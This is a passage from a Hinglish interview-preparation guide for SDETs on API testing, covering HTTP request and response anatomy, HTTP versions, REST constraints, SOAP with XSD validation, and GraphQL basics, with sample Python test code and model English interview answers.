# API Testing — SDET ka Complete Reference

> **Ye file kaise padhein**
>
> Har concept ka structure fixed hai:
> 1. **Kya hai** — Hinglish mein, simple
> 2. **Kyun** — ye exist kyun karta hai, kis problem ko solve karta hai
> 3. **Kab** — kab use/test karna hai
> 4. **Interview answer** — English mein, blockquote mein. Yahi bolna hai.
> 5. **Cross-question** — interviewer aage kya poochega, uska English answer
>
> `[REAL]` marked cheezein **aapke apne Merlin AI project** se hain. Ye ratta nahi lagta,
> ownership lagta hai. Inhe har topic mein plug karo.
>
> **Padhne ka order:** Part 1-4 foundation (isko skip mat karo, senior interview mein
> protocol-level cross-questions aate hain). Part 5-7 core skill. Part 8-11 differentiator.
> Part 12 sabse zaroori — scenario answers.

---

## Contents

| Part | Kya |
|---|---|
| **0** | Senior SDET se API testing mein kya expect hota hai |
| **1** | Protocol foundations — HTTP, versions, REST, SOAP, GraphQL |
| **2** | HTTP methods — safe/idempotent/cacheable + har method ka real bug |
| **3** | Request anatomy — headers, params, body formats |
| **4** | Status codes — exhaustive, aur QA kya test kare |
| **5** | Auth & Authorization — Basic, JWT, API key, OAuth2, cookies, mTLS |
| **6** | Response validation — body, JSON Schema, headers, timing |
| **7** | **Test design — ek endpoint ka poora suite, saara code** |
| **8** | Advanced — pagination, rate limit, idempotency, versioning, caching, CORS, webhooks |
| **9** | Contract testing — Pact, aur wo bug class jo yahi pakadta hai |
| **10** | Tooling — Postman deep, pytest+requests framework, Playwright APIRequestContext |
| **11** | Performance basics — p95/p99, throughput, concurrency |
| **12** | **10 senior scenario questions — full English answers** |
| **13** | Common API bugs — hunting checklist |
| **14** | Red flags — ye jawab mat dena |
| **15** | Quick revision table |

---

# PART 0 — Senior SDET se kya expect hota hai

## Junior vs Senior — API testing mein farq

| Junior QA | Senior SDET |
|---|---|
| Postman mein request bhejta hai, 200 dekh ke pass | Status code ko **sabse kamzor signal** maanta hai |
| "Response aa gaya, kaam kar raha hai" | Response body, headers, timing, side-effects — sab verify karta hai |
| Har endpoint alag-alag test karta hai | **Seams** test karta hai — jahan do component milte hain |
| Collection banata hai | **Framework** banata hai — client layer, data layer, assertion layer |
| Bug likhta hai: "API fail ho rahi" | Bug likhta hai: "repository method `findByX(): Optional<T>` hai but uniqueness constraint nahi hai" |
| Auth test = "token ke bina 401 aata hai" | Auth test = forgery, replay, expiry, cross-tenant, privilege escalation, IDOR |
| Positive cases | Negative + boundary + concurrency + idempotency |
| Test karta hai | Test **strategy** banata hai — kya API pe, kya UI pe, kya contract pe |

## Senior interview ka pattern

Senior round mein 3 layers hoti hain:

```
Layer 1: "Kya hai" questions        → 10% weight, screening
         "REST kya hai?" "PUT vs PATCH?"

Layer 2: "Kaise test karoge"        → 40% weight
         "Payment API kaise test karoge?"

Layer 3: "Aapne kya banaya/pakda"   → 50% weight, YAHI decide karta hai
         "Ek bug batao jo aapne API testing se pakda"
         "Framework kaise design karoge?"
```

Layer 3 ke liye aapke paas already ammunition hai — Merlin ke real bugs. Unhe har jagah
weave karo.

> **Interview answer (opening framing — jab wo poochein "tell me about your API testing experience"):**
>
> "At Merlin AI — a construction ERP — I moved from clicking through the UI to testing the
> API layer directly, because most of our real defects were not UI defects. Three examples
> that shaped how I test now. One, a public unauthenticated endpoint returned a 400 whose
> error message contained the raw Mongo query, including the org ObjectId and an internal
> `LazyLoadingProxy` dump — that's information disclosure, and no UI test would ever have
> surfaced it. Two, a customer-facing endpoint returned `totalPrice: null` and an empty
> `lineItems` array with a 200 status for a contract that had a real signed value — a
> perfect example of why status code is the weakest assertion you can write. Three, the
> backend had 57 passing integration tests covering token forgery, replay, expiry and
> cross-org access, and the end-to-end flow was still broken — because every test minted its
> own token and passed its own customerId, so the seams between components were never
> exercised. Those three taught me that API testing is about the response body, the error
> surface, and the integration seams — not about the happy path returning 200."

---

# PART 1 — Protocol foundations

Senior interview mein protocol-level cross-questions aate hain. "Kya hota hai jab aap Postman
mein Send dabate ho?" — is question se wo aapki depth naapte hain.

## 1.1 Ek HTTP request ka poora anatomy

### Kya hai

HTTP ek **text-based request/response protocol** hai jo TCP (ya HTTP/3 mein UDP+QUIC) ke upar
chalta hai. Client ek request bhejta hai, server ek response deta hai. Bas.

Raw request aisi dikhti hai — ye literally bytes hain jo wire pe jaate hain:

```http
POST /api/v1/budgets/6512ab34cd9e1f0012345678/carve HTTP/1.1
Host: staging.merlinai.co
User-Agent: python-requests/2.32.3
Accept: application/json
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 87
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1XzEyMyJ9.k3Kx...
X-Request-Id: 7f3c1a90-2b44-4d8e-9c11-aa0b2f6d5e01
Connection: keep-alive

{"scopeId":"sc_884","amount":250000,"currency":"INR","notes":"Phase 2 civil work"}
```

Isko tod ke samjho:

| Line | Naam | Kya karta hai |
|---|---|---|
| `POST /api/v1/.../carve HTTP/1.1` | **Request line** | Method + path (with query string) + protocol version |
| `Host:` | Header | Kaunsa virtual host. HTTP/1.1 mein **mandatory** — ek IP pe kai domains ho sakte hain |
| `User-Agent:` | Header | Client identify karta hai. Kuch APIs isse rate-limit/block karti hain |
| `Accept:` | Header | Client kaunsa response format chahta hai (content negotiation) |
| `Accept-Encoding:` | Header | Compression support — gzip/br |
| `Content-Type:` | Header | **Request body** kis format mein hai |
| `Content-Length:` | Header | Body kitne bytes ka hai. Galat ho to request hang ya truncate |
| `Authorization:` | Header | Credentials |
| `X-Request-Id:` | Custom header | Distributed tracing ke liye — logs correlate karne ko |
| (blank line) | **CRLF** | Headers khatam, body shuru. Ye khaali line protocol ka part hai |
| `{...}` | **Body** | Actual payload |

**Yaad rakhne wali baat:** headers aur body ke beech ek **blank line** hota hai. Ye protocol
ka structural element hai, formatting nahi. Isi se parser jaanta hai ki headers khatam ho gaye.

### Response ka anatomy

```http
HTTP/1.1 201 Created
Date: Sat, 23 Aug 2026 04:12:33 GMT
Content-Type: application/json;charset=UTF-8
Content-Length: 214
Location: /api/v1/carves/cv_99231
ETag: W/"a3f9c21e"
Cache-Control: no-store
X-Request-Id: 7f3c1a90-2b44-4d8e-9c11-aa0b2f6d5e01
Vary: Accept-Encoding
Strict-Transport-Security: max-age=31536000; includeSubDomains

{"id":"cv_99231","budgetId":"6512ab34cd9e1f0012345678","scopeId":"sc_884","amount":250000,"currency":"INR","status":"ACTIVE","createdAt":"2026-08-23T04:12:33Z","createdBy":"u_123"}
```

| Part | Kya |
|---|---|
| `HTTP/1.1 201 Created` | **Status line** — version + status code + reason phrase |
| `Location:` | Naya resource kahan bana — 201 ke saath aana chahiye |
| `ETag:` | Resource ka version fingerprint — caching aur optimistic locking ke liye |
| `Cache-Control: no-store` | Ye response cache mat karo. Sensitive data pe zaroori |
| `Vary:` | Cache ko batata hai ki response kis header pe depend karta hai |
| `Strict-Transport-Security` | Browser ko force karta hai HTTPS use karne ke liye |

### Kyun QA ko ye pata hona chahiye

Kyunki **bugs headers mein chhupte hain**, body mein nahi. Missing `Cache-Control: no-store`
sensitive endpoint pe = shared proxy pe kisi aur ka data cache ho sakta hai. Missing
`Location` on 201 = client ko naya resource dhundhna padega. Galat `Content-Type` = client
parse hi nahi kar payega.

### Request lifecycle — ASCII diagram

```
   [ Test / Postman / Browser ]
              |
              | 1. DNS resolve: staging.merlinai.co -> 34.x.x.x
              v
   [ DNS Resolver ]
              |
              | 2. TCP 3-way handshake (SYN, SYN-ACK, ACK)
              v
   [ TCP connection to :443 ]
              |
              | 3. TLS handshake (ClientHello, cert, key exchange)
              |    -> mTLS mein client bhi cert bhejta hai
              v
   [ Encrypted tunnel ]
              |
              | 4. HTTP request bytes bheje
              v
   [ CDN / Edge cache ]  -- cache hit? -> return, server tak pahuncha hi nahi
              |
              v
   [ Load Balancer ]  -- health check, TLS terminate ho sakta hai yahan
              |
              v
   [ API Gateway ]    -- rate limiting, auth pre-check, routing, CORS
              |
              v
   [ Spring Boot app ]
              |
              +--> Filter chain: CORS filter -> JWT auth filter -> tenant filter
              |
              +--> Controller: @PostMapping("/api/v1/budgets/{id}/carve")
              |
              +--> Validation: @Valid on DTO -> 400 agar fail
              |
              +--> Service layer: business rules
              |
              +--> Repository -> MongoDB
              |        |
              |        +-- unique partial index check -> DuplicateKeyException -> 409
              |
              +--> Response serialization (Jackson: entity -> JSON)
              |
              v
   [ Response travels back through the same stack ]
              |
              v
   [ Test asserts ]
```

**QA ke liye insight:** har layer response badal sakti hai. 502 gateway se aa sakta hai,
app se nahi. CORS error browser mein dikhega, curl mein nahi. Cache 200 return kar sakta
hai jabki app down hai. Isliye jab kuch weird ho — **kaunsi layer ne jawab diya**, ye pehla
sawaal hona chahiye.

> **Interview answer (what happens when you hit Send):**
>
> "The client resolves the hostname via DNS, opens a TCP connection, and does a TLS
> handshake. Then it writes a raw HTTP request — a request line with method, path and
> version, then headers, then a blank CRLF, then the body. That request usually doesn't hit
> the application directly: it passes a CDN or edge cache, a load balancer, and an API
> gateway that may handle rate limiting, CORS preflight and coarse auth. Inside the
> application it goes through a filter chain — in our Spring Boot backend that's CORS, then
> JWT authentication, then a tenant-scoping filter — before reaching the controller,
> validation, service layer, and finally the database. Every one of those layers can produce
> the response you see. So when something looks wrong, my first diagnostic question isn't
> 'what's the bug' — it's 'which layer answered me'. A 502 from the load balancer and a 500
> from the app are completely different investigations."

> **Cross-question: "How would you tell which layer answered?"**
>
> "A few signals. First, response headers — gateways and CDNs stamp their own headers like
> `Via`, `X-Cache`, `Server`, or a cloud-provider request id, and the application usually
> doesn't. Second, the body shape — our application always returns a JSON error envelope, so
> an HTML error page or a bare text body means something upstream produced it. Third, the
> correlation id — I send `X-Request-Id` on every request, and if that id appears in the
> application logs, the request reached the app; if it doesn't, it was terminated upstream.
> Fourth, timing — an infrastructure timeout typically lands on a round number like exactly
> 30 or 60 seconds, which is a strong hint it's a proxy timeout rather than application
> logic."

---

## 1.2 HTTP/1.1 vs HTTP/2 vs HTTP/3

### Kya hai — ek line mein har version

| Version | Core idea | Transport |
|---|---|---|
| **HTTP/1.0** | Har request ke liye nayi TCP connection | TCP |
| **HTTP/1.1** | Persistent connections (`keep-alive`), pipelining (practically broken), `Host` header mandatory, chunked transfer | TCP |
| **HTTP/2** | **Binary** framing, **multiplexing** ek connection pe, header compression (HPACK), server push (ab deprecated) | TCP |
| **HTTP/3** | Wahi HTTP semantics, lekin **QUIC over UDP** — TLS built-in, connection migration, no TCP head-of-line blocking | UDP + QUIC |

### Kya problem solve hui — step by step

**HTTP/1.1 ki problem: head-of-line blocking at the HTTP layer.**

Ek TCP connection pe ek time mein ek hi request-response. Agar pehli request slow hai, baaki
line mein khadi hain. Browsers ne isko hack kiya — per-domain 6 parallel connections khol ke.
Isi se "domain sharding" jaisi tricks aayi thi.

```
HTTP/1.1 — 6 connections, har ek pe serial:
conn1: [--req A--][--req G--]
conn2: [--req B--------][--req H--]
conn3: [--req C--]
...
```

**HTTP/2 ka fix: multiplexing.**

Ek TCP connection, uske andar kai **streams**. Har stream independent, frames interleave hote
hain. 100 requests ek connection pe parallel.

```
HTTP/2 — 1 connection, interleaved frames:
conn1: [A1][B1][C1][A2][C2][B2][A3][B3]...
        ^ stream id ke saath frames mixed
```

Plus **HPACK** header compression. HTTP/1.1 mein har request pe wahi 500 bytes ke headers
dobara jaate the (cookies, user-agent, auth). HTTP/2 mein wo ek baar jaate hain, phir index
reference.

**HTTP/2 ki bachi hui problem: TCP-level head-of-line blocking.**

Multiplexing HTTP layer pe hai, lekin neeche TCP hai. Ek packet drop ho jaye, TCP saare
streams ko rok deta hai jab tak retransmit nahi hota — kyunki TCP ko streams ka pata hi nahi
hai, wo ek byte-stream dekhta hai.

**HTTP/3 ka fix: QUIC over UDP.**

QUIC ko streams ka pata hai. Ek stream ka packet drop hone se baaki streams nahi rukte. Saath
mein: TLS 1.3 handshake connection setup mein hi merged hai (0-RTT/1-RTT), aur **connection
migration** — wifi se mobile data pe switch karne pe connection nahi tootta, kyunki QUIC
connection ID se identify hoti hai, IP+port se nahi.

### QA ko kyun farq padta hai

Ye sabse zyada poocha jaane wala cross-question hai, aur log "performance better hai" bol ke
ruk jaate hain. Ye concrete reasons hain:

**1. Load testing ke numbers version-dependent hote hain.**
Agar production HTTP/2 pe hai aur aapka load tool HTTP/1.1 bhej raha hai, aapke throughput
aur latency numbers galat hain. HTTP/1.1 pe connection pooling bottleneck hoga jo production
mein exist hi nahi karta — aap ek fake bottleneck measure kar rahe ho.

**2. "Parallel requests" ka matlab badal jaata hai.**
HTTP/1.1 pe client naturally 6 se zyada parallel nahi bhejta. HTTP/2 pe 100 bhej sakta hai.
Isliye **race conditions aur rate limiting HTTP/2 pe zyada aggressively expose hote hain**.
Concurrency test HTTP/2 pe bilkul alag behave karega.

**3. Header size limits.**
HTTP/2 mein `SETTINGS_MAX_HEADER_LIST_SIZE` hota hai. Bada JWT + kai custom headers = 431
Request Header Fields Too Large. Ye bug tab aata hai jab token mein bahut saare claims/roles
daal diye jaate hain.

**4. Trailers aur streaming.**
gRPC HTTP/2 pe chalta hai aur trailers use karta hai. Agar aapka proxy HTTP/1.1 pe downgrade
kar raha hai, gRPC status codes gayab ho sakte hain.

**5. HTTP/3 aur firewalls.**
UDP 443 kai corporate firewalls block karte hain. Client HTTP/3 try karke fallback karta hai —
ye fallback latency add karta hai. Ye ek real "slow only on office network" bug ka source hota hai.

```python
# Kaunsa protocol version actually use hua — check karna
# requests library HTTP/1.1 only hai. httpx HTTP/2 kar sakta hai.
import httpx

with httpx.Client(http2=True) as client:
    r = client.get("https://staging.merlinai.co/api/v1/projects/p_1/sales")
    print(r.http_version)   # "HTTP/2" ya "HTTP/1.1"
    print(r.headers.get("alt-svc"))  # h3 advertise ho raha hai kya
```

> **Interview answer:**
>
> "HTTP/1.1 gave us persistent connections, but only one request in flight per connection, so
> browsers worked around it by opening about six connections per host. HTTP/2 made the
> protocol binary and multiplexed — many independent streams over a single TCP connection,
> plus HPACK header compression, which matters a lot when you're sending a large JWT and
> cookies on every request. But HTTP/2 still sits on TCP, so a single lost packet stalls every
> stream, because TCP doesn't know streams exist. HTTP/3 moves to QUIC over UDP, which is
> stream-aware, so packet loss only affects the affected stream, TLS 1.3 is folded into the
> handshake, and connections survive a network change because they're identified by a
> connection ID rather than IP and port.
>
> As a tester I care for concrete reasons, not just 'it's faster'. If production runs HTTP/2
> and my load generator speaks HTTP/1.1, my throughput numbers are measuring a connection
> bottleneck that doesn't exist in production. Concurrency bugs surface much more readily over
> HTTP/2 because a client can genuinely fire a hundred parallel requests instead of six —
> which is exactly the condition a race condition needs. And header limits are real: HTTP/2
> caps the header list size, so an over-stuffed JWT can produce a 431 that only appears in
> production."

> **Cross-question: "So should we always use HTTP/3?"**
>
> "Not automatically. QUIC runs over UDP port 443, which some corporate networks and older
> middleboxes block outright. Clients then fail and fall back to HTTP/2, and that fallback
> costs latency — I've seen that pattern reported as 'the app is slow only in the office'.
> It's also harder to inspect: many proxies and debugging tools handle QUIC less well than
> TCP, which affects observability. So it's a rollout with a measurement plan and a fallback
> path, not a switch you flip."

---

## 1.3 REST — six constraints, aur "RESTful" ka asli matlab

### Kya hai

REST = **Representational State Transfer**. Roy Fielding ki 2000 ki PhD thesis se aaya. Ye
ek **architectural style** hai, protocol ya standard nahi. Matlab: koi "REST spec" nahi hai
jise aap validate kar sako. Isliye 95% "REST APIs" poori tarah RESTful nahi hoti — aur ye
theek hai, agar team consciously choose kar rahi ho.

### Chhe constraints

#### 1. Client–Server separation

UI aur data storage alag. Dono independently evolve kar sakte hain.

**QA impact:** yahi wajah hai ki API testing UI ke bina possible hai. Aur yahi wajah hai ki
API contract badalna frontend ko tod sakta hai — isliye contract testing chahiye.

#### 2. Stateless

Har request mein **saari information honi chahiye** jo server ko chahiye. Server client ka
koi session state nahi rakhta requests ke beech.

```
Stateless (sahi):
  GET /api/v1/projects/p_1/sales
  Authorization: Bearer <jwt jisme user id + org id hai>
  -> server har baar token se identity nikaalta hai

Stateful (REST violation):
  POST /login          -> server memory mein session banata hai
  GET /projects        -> server "current user" apni memory se uthata hai
  GET /projects/1/sales -> pichli call pe depend
```

**QA impact — ye sabse practical constraint hai:**
- Stateless API mein har test **independent** ho sakta hai. Koi bhi order mein chala sakte ho, parallel chala sakte ho.
- Agar tests order-dependent ho rahe hain, ya parallel chalane pe fail ho rahe hain — API kahin state rakh rahi hai. Ye ya to design issue hai, ya aapka test data shared hai.
- **Load balancing test:** stateless API kisi bhi instance pe ja sakti hai. Agar "sticky session" chahiye, wo statelessness break hai — aur scaling problem hai. Test: same token se repeated requests bhejo, agar random instances pe alag behaviour hai to state server-side hai.

> **[REAL]** Merlin ka JWT cookie se aata hai aur har request mein Bearer token jaata hai —
> ye stateless design hai. Iska direct QA fayda: main koi bhi API test kisi bhi order mein,
> parallel, chala sakta hoon, bas har test apna scoped data use kare.

#### 3. Cacheable

Response ko explicitly batana chahiye ki cacheable hai ya nahi (`Cache-Control`, `ETag`).

**QA impact:** sensitive endpoints pe `Cache-Control: no-store` **hona chahiye**. Ye ek real
security test hai — agar user-specific financial data cacheable marked hai, shared CDN/proxy
pe wo dusre user ko serve ho sakta hai.

#### 4. Uniform Interface

Ye sabse bada constraint hai, iske 4 sub-parts hain:

| Sub-constraint | Matlab |
|---|---|
| **Resource identification** | URI resource identify kare — `/sales/{id}`, action nahi — `/getSale?id=` |
| **Manipulation through representations** | Client ko jo JSON mila, usi ko modify karke wapas bhej sake |
| **Self-descriptive messages** | Message khud batata hai use kaise process karein — `Content-Type` |
| **HATEOAS** | Response mein links hon ki aage kya kar sakte ho |

#### 5. Layered System

Client ko nahi pata ki wo directly server se baat kar raha hai ya proxy/CDN/gateway se.

**QA impact:** yahi wajah hai ki "kaunsi layer ne jawab diya" wala sawaal important hai.

#### 6. Code on Demand (optional)

Server executable code bhej sakta hai (JavaScript). Ye **optional** constraint hai — REST ka
akela optional constraint. Practically APIs mein use nahi hota.

### Richardson Maturity Model

Leonard Richardson ka model — API kitni RESTful hai, 0 se 3:

```
Level 0 — "The Swamp of POX" (Plain Old XML)
  Ek endpoint, ek method. SOAP-style.
  POST /api    body: {"action":"getSale","id":"s_1"}
  POST /api    body: {"action":"closeSale","id":"s_1"}
  -> HTTP sirf transport tunnel hai

Level 1 — Resources
  Alag-alag URI, lekin abhi bhi sab POST.
  POST /sales/s_1/get
  POST /sales/s_1/close
  -> resources aa gaye, methods nahi

Level 2 — HTTP Verbs  <-- 95% "REST APIs" yahan hain, aur ye theek hai
  GET    /api/v1/sales/s_1
  POST   /api/v1/sales
  PATCH  /api/v1/sales/s_1
  DELETE /api/v1/sales/s_1
  + sahi status codes: 200, 201, 204, 404, 409
  -> methods ka semantic matlab use ho raha hai

Level 3 — HATEOAS
  Response mein links, client discover karta hai kya possible hai
  {
    "id": "s_1",
    "status": "OPEN",
    "_links": {
      "self":  {"href": "/api/v1/sales/s_1"},
      "close": {"href": "/api/v1/sales/s_1/close", "method": "POST"},
      "spine": {"href": "/api/v1/sales/s_1/spine"}
    }
  }
  -> agar sale already CLOSED hai, "close" link hi nahi aayega
```

> **Interview answer:**
>
> "REST is an architectural style, not a specification — which is why there's no such thing as
> validating an API 'against the REST spec'. Fielding defined six constraints: client-server
> separation, statelessness, cacheability, a uniform interface, a layered system, and
> optionally code-on-demand. The uniform interface is the big one and it has four parts:
> resources identified by URI, manipulation through representations, self-descriptive
> messages, and HATEOAS.
>
> The Richardson Maturity Model is a useful way to place a real API. Level 0 is one endpoint
> tunnelling everything over POST. Level 1 introduces resource URIs. Level 2 uses HTTP verbs
> and status codes semantically — and honestly that's where the overwhelming majority of
> production APIs sit, including ours, and that's a reasonable engineering choice. Level 3 adds
> hypermedia controls.
>
> The constraint I actually exploit as a tester is statelessness. If every request carries its
> own auth and context, then every test can be independent — I can run them in any order and in
> parallel. So when a test suite starts failing under parallel execution, that's a signal
> worth chasing: either the API is holding state it shouldn't, or my tests are sharing data
> they shouldn't."

> **Cross-question: "Our API isn't Level 3. Is that a problem you'd raise as a bug?"**
>
> "No — I'd never file 'not HATEOAS-compliant' as a defect. Level 3 has a real cost: clients
> have to be written to follow links rather than construct URLs, and most frontend teams don't
> build that way. What I would raise as defects are Level 2 violations that cause actual harm:
> a POST that isn't idempotent and has no idempotency key, a DELETE that returns 200 with a
> body sometimes and 204 other times, a create that returns 200 instead of 201 with no
> `Location` header, or an error returning 200 with an error object inside — because that last
> one silently breaks every client's error handling."

> **Cross-question: "Give me one concrete test that only exists because of the stateless constraint."**
>
> "Session-affinity testing. I take a valid token, fire the same authenticated request many
> times against a load-balanced environment, and assert the responses are identical. If some
> requests succeed and others fail with an auth or 'context not found' error, the server is
> holding per-connection state, and the API only works because of sticky sessions. That's not
> a cosmetic REST violation — it means the service can't scale horizontally and will break
> during a rolling deploy."

---

## 1.4 SOAP — basics, aur kab abhi bhi milta hai

### Kya hai

SOAP = **Simple Object Access Protocol**. XML-based messaging protocol. REST ke ulta, SOAP ek
**actual specification** hai — strict rules hain, validate kiya ja sakta hai.

### SOAP envelope structure

```xml
<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">

  <soap:Header>
    <!-- Optional. Auth, transaction id, routing metadata yahan -->
    <wsse:Security xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
      <wsse:UsernameToken>
        <wsse:Username>merlin_svc</wsse:Username>
        <wsse:Password Type="...#PasswordDigest">a3f9...</wsse:Password>
      </wsse:UsernameToken>
    </wsse:Security>
  </soap:Header>

  <soap:Body>
    <!-- Mandatory. Actual payload -->
    <GetSaleDetails xmlns="http://merlinai.co/erp">
      <SaleId>s_1024</SaleId>
    </GetSaleDetails>
  </soap:Body>

</soap:Envelope>
```

Error case mein Body ke andar `<soap:Fault>` aata hai — **aur HTTP status usually 500 hota
hai**, chahe error business-level ho:

```xml
<soap:Body>
  <soap:Fault>
    <faultcode>soap:Client</faultcode>
    <faultstring>Sale not found</faultstring>
    <detail><errorCode>SALE_404</errorCode></detail>
  </soap:Fault>
</soap:Body>
```

### WSDL kya hai

**WSDL** = Web Services Description Language. Ek XML file jo poori service describe karti hai:
kaunse operations hain, har operation ka input/output type kya hai, endpoint URL kya hai,
binding kya hai.

Ye REST ke OpenAPI/Swagger ka equivalent hai — **lekin ek badi difference ke saath: WSDL
mandatory aur machine-enforced hai.** Aap WSDL se client code auto-generate kar sakte ho, aur
request XSD ke against strictly validate hoti hai.

```
merlin-erp.wsdl
├── <types>       -> XSD schemas — data types define
├── <message>     -> input/output messages
├── <portType>    -> operations (GetSaleDetails, CloseSale)
├── <binding>     -> protocol details (SOAP over HTTP)
└── <service>     -> actual endpoint address
```

### SOAP vs REST — comparison table

| Dimension | SOAP | REST |
|---|---|---|
| **Kya hai** | Protocol (strict spec) | Architectural style |
| **Format** | XML only | JSON, XML, anything |
| **Contract** | WSDL — mandatory, machine-readable | OpenAPI — optional, often stale |
| **Transport** | HTTP, SMTP, JMS, TCP | HTTP only (practically) |
| **HTTP methods** | Usually POST only | GET/POST/PUT/PATCH/DELETE semantically |
| **Error handling** | `<soap:Fault>`, usually HTTP 500 | HTTP status codes |
| **Status codes** | Barely used — sab 200 ya 500 | Central to the design |
| **Security** | WS-Security — message-level, signing, partial encryption | TLS transport-level + OAuth/JWT |
| **Transactions** | WS-AtomicTransaction — distributed ACID | Nothing built-in; saga patterns manually |
| **Statefulness** | Stateful ho sakta hai (WS-*) | Stateless by constraint |
| **Payload size** | Bhaari — XML + envelope overhead | Halka — JSON |
| **Caching** | Practically nahi (sab POST) | GET cacheable, ETag support |
| **Tooling** | SoapUI, wsdl2java | Postman, curl, har HTTP client |
| **Learning curve** | Steep | Shallow |
| **Kahan milta hai** | Banking, insurance, telecom, government, healthcare (HL7), legacy ERP | Modern web/mobile, microservices, public APIs |

### Kab abhi bhi use hota hai

- **Banking/payments** — WS-Security aur non-repudiation ki wajah se. Message ko digitally sign karna, sirf ek field encrypt karna — REST mein ye built-in nahi.
- **Insurance, telecom** — legacy systems jo 15 saal se chal rahe hain, replace ki cost justify nahi hoti.
- **Government/healthcare** — regulatory contracts jo XSD-level validation demand karte hain.
- **Enterprise ERP integrations** — SAP, Oracle ke bahut saare interfaces abhi bhi SOAP hain.

### SOAP testing mein QA kya karta hai

```python
# SOAP endpoint test karna — plain requests se
import requests
from lxml import etree

SOAP_URL = "https://legacy.example.com/erp/SaleService"

envelope = """<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetSaleDetails xmlns="http://merlinai.co/erp">
      <SaleId>{sale_id}</SaleId>
    </GetSaleDetails>
  </soap:Body>
</soap:Envelope>"""


def test_soap_get_sale_returns_expected_fields():
    body = envelope.format(sale_id="s_1024")

    resp = requests.post(
        SOAP_URL,
        data=body.encode("utf-8"),
        headers={
            "Content-Type": "text/xml; charset=utf-8",
            # SOAPAction header SOAP 1.1 mein routing ke liye zaroori hota hai
            "SOAPAction": "http://merlinai.co/erp/GetSaleDetails",
        },
        timeout=30,
    )

    # SOAP mein 200 aane ka matlab success nahi — Fault bhi 500 ya 200 mein aa sakta hai
    assert resp.status_code in (200, 500)

    root = etree.fromstring(resp.content)
    ns = {
        "soap": "http://schemas.xmlsoap.org/soap/envelope/",
        "erp": "http://merlinai.co/erp",
    }

    # PEHLE Fault check karo — ye SOAP testing ki sabse badi galti hai jo log karte hain
    fault = root.find(".//soap:Fault", ns)
    assert fault is None, f"SOAP Fault mila: {etree.tostring(fault, pretty_print=True)}"

    total = root.find(".//erp:TotalPrice", ns)
    assert total is not None, "TotalPrice element response mein hai hi nahi"
    assert float(total.text) > 0
```

**XSD validation** — SOAP ka sabse strong QA lever:

```python
from lxml import etree

def test_response_validates_against_xsd():
    """WSDL ke andar ka XSD nikaal ke response ko uske against validate karo.
    REST mein iska equivalent JSON Schema validation hai."""
    schema_doc = etree.parse("schemas/sale-service.xsd")
    schema = etree.XMLSchema(schema_doc)

    resp_root = etree.fromstring(get_soap_response())
    body = resp_root.find("{http://schemas.xmlsoap.org/soap/envelope/}Body")
    payload = body[0]   # envelope ke andar actual payload

    # assertValid exception throw karta hai detailed message ke saath
    schema.assertValid(payload)
```

> **Interview answer:**
>
> "SOAP is a protocol with an actual specification, where REST is an architectural style.
> A SOAP message is an XML envelope with an optional header — used for WS-Security, transaction
> context, routing — and a mandatory body. Errors come back as a `soap:Fault` inside the body,
> and critically the HTTP status is usually 500 or 200 regardless of whether the error is a
> client mistake or a server crash. So in SOAP testing, asserting on HTTP status is almost
> meaningless; the first assertion has to be 'is there a Fault element'.
>
> The service is described by a WSDL, which is the equivalent of OpenAPI but with a much
> stronger guarantee — it's mandatory, it's machine-readable, and it embeds XSD schemas, so
> you can generate a client from it and validate every message against the schema. That's
> genuinely a strength over typical REST, where the OpenAPI doc is optional and often out of
> date.
>
> SOAP still shows up in banking, insurance, telecom, healthcare and legacy ERP integrations,
> mainly because WS-Security offers message-level signing and partial encryption and
> non-repudiation, which TLS alone doesn't give you — TLS protects the pipe, not the message
> once it's stored. If I were testing SOAP, my leverage points would be XSD validation of both
> request and response, explicit Fault-path testing, and WS-Security header manipulation."

> **Cross-question: "Why did REST win, then?"**
>
> "Cost and fit. SOAP's guarantees — distributed transactions, message-level security, formal
> contracts — solve enterprise integration problems, and they carry real overhead in payload
> size, tooling and developer time. When the dominant clients became browsers and mobile apps
> talking to their own backend over TLS, most of those guarantees became redundant: the client
> and server are the same organisation, TLS covers the transport, and JSON parses natively in
> JavaScript. REST also plays well with HTTP caching and CDNs, which SOAP doesn't because
> everything is a POST. So REST won where the problem was simpler, and SOAP stayed where the
> problem genuinely is that hard."

---

## 1.5 GraphQL

### Kya hai

GraphQL ek **query language for APIs** hai. REST mein server decide karta hai ki response mein
kya aayega; GraphQL mein **client** decide karta hai — exactly kaunse fields chahiye.

Ek endpoint hota hai, usually `POST /graphql`, aur query body mein jaati hai.

```graphql
# Query — data padhna (REST ka GET)
query GetSaleWithSpine($saleId: ID!) {
  sale(id: $saleId) {
    id
    status
    totalPrice
    customer {
      name
      emailAddress
    }
    spine {
      milestones {
        name
        dueDate
        amount
      }
    }
  }
}
```

```graphql
# Mutation — data badalna (REST ka POST/PUT/PATCH/DELETE)
mutation CloseSale($saleId: ID!, $reason: String) {
  closeSale(id: $saleId, reason: $reason) {
    id
    status
    closedAt
  }
}
```

```graphql
# Subscription — server se real-time push (WebSocket pe)
subscription OnBudgetCoverageChanged($budgetId: ID!) {
  budgetCoverageChanged(budgetId: $budgetId) {
    budgetId
    coveragePercent
    updatedAt
  }
}
```

### Kyun exist karta hai

Do problems solve karta hai:

**Over-fetching:** REST mein `GET /api/v1/sales/{id}` poora object deta hai — 40 fields — jab
mobile app ko sirf 3 chahiye. Bandwidth waste.

**Under-fetching / N+1 round trips:** Sale chahiye + uska customer + uske milestones = 3
separate REST calls. Mobile pe har round trip latency add karta hai.

### GraphQL mein errors 200 ke saath kyun aate hain

Ye sabse zyada poocha jaane wala GraphQL question hai QA ke liye.

GraphQL HTTP ko **sirf transport** ki tarah use karta hai — SOAP ki tarah. HTTP status batata
hai ki *transport* successful tha, na ki *query* successful thi.

Aur iska ek genuine design reason hai: **GraphQL response partially successful ho sakta hai.**

```json
HTTP/1.1 200 OK

{
  "data": {
    "sale": {
      "id": "s_1024",
      "status": "OPEN",
      "totalPrice": 4500000,
      "customer": null
    }
  },
  "errors": [
    {
      "message": "Not authorized to read customer contact",
      "path": ["sale", "customer"],
